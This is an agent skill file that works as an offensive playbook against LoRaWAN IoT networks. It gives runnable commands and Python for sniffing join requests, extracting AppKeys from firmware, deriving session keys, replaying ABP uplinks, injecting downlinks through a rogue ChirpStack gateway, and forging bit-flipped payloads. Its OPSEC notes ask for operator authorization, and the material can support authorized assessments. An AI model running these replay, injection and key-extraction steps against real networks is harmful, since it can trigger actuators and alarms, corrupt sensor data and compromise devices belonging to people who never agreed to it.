---
name: lorawan-otaa
description: LoRaWAN OTAA join-procedure analysis (DevEUI/AppEUI/AppKey extraction), frame-counter replay on ABP devices, downlink injection via rogue gateway, bit-flipping on unprotected FRMPayload, and network enumeration with ChirpStack and the LoRaWAN Auditing Framework.
allowed-tools: Bash Read Write
metadata:
  subdomain: iot
  when_to_use: LoRaWAN, OTAA, ABP, AppKey, DevEUI, AppEUI, JoinEUI, frame counter, replay, downlink injection, ChirpStack, LoRa, LoRaWAN auditing framework, gateway, bit flip, ABP replay
  tags: lorawan, otaa, abp, lora, iot, replay, downlink, chirpstack, iot-embedded
  mitre_attack: T1040, T1557, T1190, T1499.004
---

# LoRaWAN OTAA / ABP Security Assessment

> LoRaWAN is deployed globally for smart meters, asset tracking, agriculture,
> and industrial sensors. OTAA (Over-The-Air Activation) derives session keys
> per join; ABP (Activation By Personalization) hardcodes them. Both have
> documented attack surface: OTAA AppKeys are often extracted from the device
> firmware or exposed via insecure provisioning, and ABP devices commonly
> disable the frame-counter check, enabling full replay.

## Prerequisites

- **Hardware**: LILYGO TTGO T-Beam (SX1276 + GPS, programmable SDR-LoRa node),
  RAK831 / RAK2247 gateway concentrator, or HackRF One with gr-lora.
  RTL-SDR is receive-only (works for capture on EU 868 MHz).
- **Software**: ChirpStack (rogue gateway NS), `lorawansniffer` / `gr-lora`,
  LoRaWAN Auditing Framework (LAF), Scapy-LoRa. The offline JoinRequest
  example below uses only the Python standard library.

```bash
# Install LoRaWAN Auditing Framework:
git clone https://github.com/IOActive/laf
cd laf && pip install -r requirements.txt

# Install gr-lora (GNU Radio LoRa decoder):
git clone https://github.com/rpp0/gr-lora
cd gr-lora && mkdir build && cd build && cmake .. && make && sudo make install

```

## LoRaWAN Frequency Reference

| Region | Uplink (MHz) | Downlink (MHz) | Spreading Factors |
|---|---|---|---|
| EU868 | 868.1, 868.3, 868.5 | 869.525 | SF7–SF12 |
| US915 | 902.3–914.9 (8 ch) | 923.3–927.5 | SF7–SF10 |
| AU915 | 915.2–927.8 | 923.3–927.5 | SF7–SF12 |
| AS923 | 923.2, 923.4 | 923.2, 923.4 | SF7–SF12 |

## Phase 1: Passive Air Capture

```bash
# RTL-SDR capture on EU868 primary channel, SF7 (fastest, most common):
rtl_sdr -f 868100000 -s 1000000 -g 40 /tmp/lora_raw.iq

# Decode with gr-lora offline:
python3 gr-lora/apps/rx_file.py --freq 868.1e6 --sf 7 --bw 125000 \
    --input /tmp/lora_raw.iq --output /tmp/lora_frames.txt

# Online decode with TTGO T-Beam running LoRa sniffer firmware:
# Flash: https://github.com/claudiodangelis/lora-sniffer
# Serial output at 115200:
screen /dev/ttyUSB0 115200
```

LAF spectrum scan (scans all EU868 channels across SF7-SF12):

```bash
python3 laf/laf.py scan --freq 868.1,868.3,868.5 --sf all --bw 125 \
    --device /dev/ttyACM0 | tee /tmp/laf_scan.txt
```

## Phase 2: OTAA Join Analysis

OTAA JoinRequest contains **DevEUI** (8 bytes), **AppEUI/JoinEUI** (8 bytes),
and DevNonce (2 bytes), all in plaintext. Only the **MIC** is keyed with AppKey.

```bash
# Parse a captured JoinRequest frame:
python3 - <<'EOF'
def parse_join_request(payload_hex):
    payload = bytes.fromhex(payload_hex)
    if len(payload) != 23 or payload[0] != 0:
        raise ValueError("Expected a 23-byte LoRaWAN JoinRequest with MHDR 0x00")
    return {
        "JoinEUI/AppEUI": payload[1:9][::-1].hex(),
        "DevEUI": payload[9:17][::-1].hex(),
        "DevNonce": int.from_bytes(payload[17:19], "little"),
        "MIC (unverified)": payload[19:23].hex(),
    }

# Synthetic fixture; replace with a captured PHY payload (not a radio header).
# EUI fields and DevNonce are transmitted least-significant byte first.
payload_hex = "0008070605040302018877665544332211010000000000"
for field, value in parse_join_request(payload_hex).items():
    print(f"{field}: {value}")
# This decodes fields only; it does not authenticate the MIC or derive keys.
EOF
```

AppKey extraction from firmware (if binary is available):

```bash
# binwalk extracts the firmware; AppKey is a 16-byte value near DevEUI in flash.
binwalk -eM firmware.bin
# Search for DevEUI (known from OTA capture) ± 32 bytes:
python3 - <<'EOF'
import re, sys
dev_eui = bytes.fromhex("AABBCCDDEEFF0011")  # from captured JoinRequest
fw = open("_firmware.bin.extracted/0.bin", "rb").read()
offset = fw.find(dev_eui)
if offset >= 0:
    print(f"DevEUI at 0x{offset:08x}")
    print(f"Surrounding 48 bytes: {fw[offset-16:offset+32].hex()}")
    # AppKey is likely 16 bytes before or after DevEUI in the provisioning struct.
EOF
```

## Phase 3: AppKey Brute-Force / Known-Key Verification

With a known AppKey, verify and derive session keys:

```python
import hmac, hashlib
from Crypto.Cipher import AES

APP_KEY = bytes.fromhex("2B7E151628AED2A6ABF7158809CF4F3C")  # known/extracted key

def verify_join_request_mic(phypayload: bytes, app_key: bytes) -> bool:
    """Verify MIC of LoRaWAN JoinRequest. MIC = CMAC(AppKey, MHDR||AppEUI||DevEUI||DevNonce)[0:4]"""
    from Crypto.Hash import CMAC
    msg = phypayload[:-4]  # strip 4-byte MIC
    claimed_mic = phypayload[-4:]
    cobj = CMAC.new(app_key, ciphermod=AES)
    cobj.update(msg)
    return cobj.digest()[:4] == claimed_mic

def derive_session_keys(app_key: bytes, app_nonce: bytes, net_id: bytes, dev_nonce: bytes):
    """Derive NwkSKey and AppSKey from OTAA join-accept parameters."""
    def aes_ecb(key, data):
        return AES.new(key, AES.MODE_ECB).encrypt(data)
    nwk_s_key = aes_ecb(app_key, b'\x01' + app_nonce + net_id + dev_nonce + b'\x00'*7)
    app_s_key = aes_ecb(app_key, b'\x02' + app_nonce + net_id + dev_nonce + b'\x00'*7)
    return nwk_s_key, app_s_key
```

## Phase 4: ABP Replay (Frame-Counter Disabled)

ABP devices that disable frame-counter replay protection (`FCnt` check = off)
will process any replayed uplink frame:

```bash
# LAF replay module — replay a captured uplink to the same gateway:
python3 laf/laf.py replay \
    --payload <captured_phypayload_hex> \
    --freq 868.1 --sf 7 --bw 125 \
    --device /dev/ttyACM0 \
    --count 5  # send 5 times to ensure reception

# The NS will process duplicate frames with identical FCnt if check is disabled.
```

Detect FCnt check status:
- If the NS accepts two frames with the same FCnt → check is disabled.
- Send an older FCnt (FCnt-1) — if accepted, ABP FCnt is not enforced.

## Phase 5: Downlink Injection via Rogue Gateway

Set up a ChirpStack rogue gateway to inject downlinks to a device whose
AppSKey is known (from extracted firmware or OTAA with known AppKey):

```bash
# 1. Stand up ChirpStack Network Server (docker-compose):
git clone https://github.com/brocaar/chirpstack-docker
cd chirpstack-docker && docker-compose up -d

# 2. Register a gateway pointing to your TTGO/RAK concentrator.
# 3. Register the target device (DevEUI, AppKey from extraction).
# 4. Use ChirpStack API to enqueue a downlink:
curl -s -X POST "http://localhost:8080/api/devices/${DEV_EUI}/queue" \
  -H "Grpc-Metadata-Authorization: Bearer ${JWT_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"deviceQueueItem": {"confirmed": false, "fPort": 1, "data": "AQIDBA=="}}'
```

Craft raw downlink with known AppSKey (ABP or derived from OTAA):

```python
from Crypto.Cipher import AES

def encrypt_frmpayload(app_s_key: bytes, dev_addr: bytes, fcnt: int,
                        direction: int, plaintext: bytes) -> bytes:
    """LoRaWAN AES-128-CTR FRMPayload encryption."""
    k = len(plaintext)
    blocks = (k + 15) // 16
    s = b""
    for i in range(1, blocks + 1):
        ai = (b'\x01' + b'\x00'*4 + bytes([direction]) +
              dev_addr[::-1] +                # little-endian
              fcnt.to_bytes(4, 'little') +
              b'\x00' + bytes([i]))
        s += AES.new(app_s_key, AES.MODE_ECB).encrypt(ai)
    return bytes(a ^ b for a, b in zip(plaintext, s[:k]))
```

## Phase 6: Bit-Flip Attack on Unconfirmed Uplinks (ABP, no MIC validation)

When ABP NwkSKey is known, craft MIC for a bit-flipped FRMPayload to alter
plaintext content (e.g., sensor reading reported to cloud):

```python
# Flip a specific bit in the ciphertext → predictable plaintext change.
# Only viable if the application layer does not validate message integrity
# beyond LoRaWAN MIC (which the attacker can recalculate with NwkSKey).
# This is documented in Toothpick / LoRaWAN security analysis papers.
ciphertext = bytearray(encrypted_payload)
ciphertext[TARGET_BYTE] ^= FLIP_MASK
# Recalculate MIC with NwkSKey and submit via rogue gateway.
```

## Evidence

```bash
EVIDENCE="/workspace/evidence/lorawan-otaa/$(date +%Y%m%d_%H%M%S)"
mkdir -p "$EVIDENCE"
cp /tmp/lora_frames.txt "$EVIDENCE/"
cp /tmp/laf_scan.txt "$EVIDENCE/"
sha256sum "$EVIDENCE"/* >> "$EVIDENCE/sha256.txt"
```

```python
kg_add_node(
    kind="finding",
    label=f"LoRaWAN AppKey extracted for DevEUI={dev_eui_hex}",
    props={
        "key": f"lorawan-otaa::{dev_eui_hex}",
        "dev_eui": dev_eui_hex,
        "app_eui": app_eui_hex,
        "app_key": app_key_hex,
        "abp_fcnt_disabled": abp_fcnt_disabled,
        "source": "firmware-extraction+laf",
    },
)
```

## OPSEC Notes

- OTAA capture is passive — no RF emission. RTL-SDR or TTGO sniffer only.
- Replaying to a live NS will generate real device state changes (actuators,
  alarms). Gate replay tests on explicit operator authorization.
- A rogue gateway is detectable by the NS if geo-location of the gateway IP
  differs from the registered GPS position.
- LoRaWAN 1.1 adds replay protection and frame-counter synchronization that
  mitigates ABP replay; verify spec version before testing.
- Downlink injection affects device behavior (firmware OTA possible on some
  devices via downlink commands). Treat as destructive.

## References

- LoRaWAN Auditing Framework (LAF): https://github.com/IOActive/laf
- ChirpStack: https://www.chirpstack.io
- gr-lora: https://github.com/rpp0/gr-lora
- Butun et al. "Security of LoRaWAN v1.1" (2019) — frame-counter and replay analysis.
- Toothpick: LoRaWAN downlink injection PoC (DEF CON 27).
